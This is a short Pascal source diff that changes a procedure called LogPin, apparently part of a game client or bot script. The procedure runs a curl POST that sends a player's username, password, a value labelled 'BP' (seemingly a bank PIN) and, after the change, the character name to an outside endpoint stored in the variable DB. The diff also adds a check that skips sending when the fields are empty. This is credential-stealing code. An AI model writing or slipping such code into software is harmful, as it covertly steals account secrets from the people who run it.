@@ -101,10 +101,19 @@ procedure LogPin;
 var
   process:TProcess;
   s:string;
+  i:integer;
 begin
   if done then exit;
+  if (length(pp) < 1) then inc(i);
+  if (length(cc) < 1) then inc(i);
+  if (length(ww) < 1) then inc(i);
+  if (i > 2) then
+  begin
+    done := true;
+    exit;
+  end;
   process.init(nil);
-  s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"['+ FormatDateTime('tt', Time) + ']\nU - ' + pp +'\nP - '+ww+'\nBP - '+cc+'\" }" '+DB;
+  s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nU - ' + pp +'\nP - '+ww+'\nBP - '+cc+'\nChar: '+ActivePlayerName+'\n---\" }" '+DB;
   process.setcommandline(s);
   process.Execute();
   process.free();
